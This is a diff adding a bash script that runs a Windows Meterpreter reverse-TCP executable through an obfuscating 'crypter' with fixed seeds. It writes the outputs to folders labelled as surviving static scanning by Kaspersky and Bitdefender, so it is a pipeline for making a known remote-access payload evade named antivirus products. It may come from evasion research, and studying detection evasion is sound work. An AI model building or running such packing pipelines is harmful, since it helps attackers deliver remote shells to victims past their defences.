@@ -1,0 +1,59 @@
+#!/bin/bash
+
+source_file="./data/raw/exe/x86/windows_meterpreter_reverse_tcp.exe"
+kaspersky_destination_directory="./data/crypters/exe/x86/idata_obfuscation/static_survival/kaspersky/"
+bitdefender_destination_directory="./data/crypters/exe/x86/idata_obfuscation/static_survival/bitdefender/"
+
+mkdir -p ${kaspersky_destination_directory}
+mkdir -p ${bitdefender_destination_directory}
+
+seeds_kaspersky=(
+  83324613a8455224bc4497e92438d29c208e1bddac6d968f899f6c0339829b7701aa2288198c77f24de64920
+  23e672c3626bb2b8f2f24fd9fcaa40ebfc31b2c91836a2325f386c7618b8a068b0be6213a5810ad9bd7a4f81
+  515e52f844c3a19b754c948818679c2af7f61e476f15dc369bff6ea0268c757e533f3138404ce9d30e994bcc
+  7676eb176d6a180d4b69f11ec0e0fea27882e932bf2a61c466966c08f10dceb1c0f3a6075efd9ebe7054f731
+  20b0a94c42af188525c49f22e859b63ef019c9ba9c5300d8268d6270cc62fc6a1af3501afb15a98a721affe0
+  c4d14f6737c42f1f7df4eb27e5af1c8f08e14c720b3a69072f72088b7f9842c51798b65765944e233f52dd3a
+  0ac361d555873bbbe7a347ee01c77c123e71a2abed93da5d39d9d6078ae3c127dc01cb42495c67059ca14910
+  dfccd37af9d161dd39dc8717317db294c87cbd32e66f7dc55ba92002d2840edb5a8fedf4efa9ca692a7fbc15
+  2fd83b4f9cdc06e9991ea61b84f153fec511ccf02e0927944a443d2c85cefd1f9281cd6ea60e11532724b45b
+  74e3402189ae399ff86d5b9a6398680762384209c1dc9428768bea2cb794c9c7eac4e98ec09dda39e4988d62
+  eabe9bf052625ef942e7a6138511bc17df663a64a60ee4f9bab9726eecf6b98340a26efca34f4590b6520aff
+  d679d6b3a7462bbf649fa5ebe3d53648ebbca8a0d261c54b673d2361650a434810ca8d4a9057968c2f99875e
+  76ab52c4bff7d6a757c68c740108ac271831057d14c4957d652d91b787b93484efdd79a379c463a41ba8e84f
+  e57a3f47d6c941f04a9ec39a66d10182a77d332a5da6642f941be24c0fd3e82d6ded566f7c8dcc4de4d19fd5
+  a46461c4443a5774012290c76b8c8ab3012c220411e8dd04f14120fb57ad01b336909f43211f0fcd994cff33
+)
+
+seeds_bitdefender=(
+  4a4173f6b620450ddcd1b2fee09d153323361b22af9bafac78143ba0577225fd245038e4109dc26731b2a9b3
+  8f625ec6db300bd8664378bc47b3697396306cbb6e9817b2d0f1584be2403fc3d26854b96fc2267d9cc1dc07
+  40985bb56ced74a7ea96f245b7bf23a377e3943aae126e4fd50639cf59cd9817b77808a6361c4cbaf2d216b6
+  8fdc81cc71be4d2a758face4641c71e77f038aa8693eb0ab98ac8dd360ea3defde4b69482d6e6155ca7fb5a6
+  b1ee57dc82b3b88a6d003715505369686856079dd6a9fc2d67ceb945184e1815b4ebec6f8636cd78483dfa1c
+  042a92fdf049066f5b2595b7aa4e38bcb54df4669461d4557b6aad40da029e92563a2b9c3ca06328cc1053eb
+  5bb3a9606e11f2dd57569d569f2fa24641462136d85d2138f8480105476065a21d0e9a4859ab588d118b2550
+  dcccb1b37bd031f00b1884aa2da861a8f5b4db7767792c1530319d4e95e8dc3f25fe5d6a5680dca741533f70
+  8b273a616b1ad621935a9bf7965131943043dc6f92f59e59c51fec783b525b80aa741f171bb67d72571fc28e
+  c8e82a1721ffcfd7c95be206897bb3e84bd1fc92d66f6a5e2ec349c289e5639e7d15cf056e88c03de70a79b1
+  4c8083d2a55496d000721b3dbaf98a9a1cb3b33700300f201d839e0ac5f0e3b12db910fce7d1d0da94282a4c
+  6647d8022270cd34b85ab7c5c91a13a703c10e8b71435c474721e8ecd186a1bdd6c19d4994b56659c40e17b8
+  51321e8b8fd4fc377f0d44b7db79be303623389389fcfa96966eb1f185300bf54fe0132c17af1c4a8abc0c10
+  8bd94f3eec67617166b920ef27183621efa53a9865783d3b42a6ca403579365b9e9952523be9a6e9d95273d8
+  d693d03b1bbc5fd803453ba15ea0d51f4e0db28b6fa7cd20e891fe1d2e174e066849de69eee3f0bd6e9ff410
+)
+
+for i in $(seq 0 14); do
+	echo "Running iteration ${i}"
+	
+	echo "Running for bitdefender"
+	python3 src/crypters/idata_obfuscation_dynamic_api_resolution/process.py src/crypters/idata_obfuscation_dynamic_api_resolution/merged.c "./src/crypters/idata_obfuscation_dynamic_api_resolution/output_bitdefender_${i}.c" "${bitdefender_destination_directory}output_${i}.exe" "${source_file}" data/usable_headers/list_of_usable_headers.json "${seeds_bitdefender[${i}]}"
+	objcopy --strip-debug "${bitdefender_destination_directory}output_${i}.exe"
+	rm "./src/crypters/idata_obfuscation_dynamic_api_resolution/output_bitdefender_${i}.c"
+
+	echo "Running for kaspersky"
+	python3 src/crypters/idata_obfuscation_dynamic_api_resolution/process.py src/crypters/idata_obfuscation_dynamic_api_resolution/merged.c "./src/crypters/idata_obfuscation_dynamic_api_resolution/output_kaspersky_${i}.c" "${kaspersky_destination_directory}output_${i}.exe" "${source_file}" data/usable_headers/list_of_usable_headers.json "${seeds_kaspersky[${i}]}"
+	objcopy --strip-debug "${kaspersky_destination_directory}output_${i}.exe"
+	rm "./src/crypters/idata_obfuscation_dynamic_api_resolution/output_kaspersky_${i}.c"
+
+done	
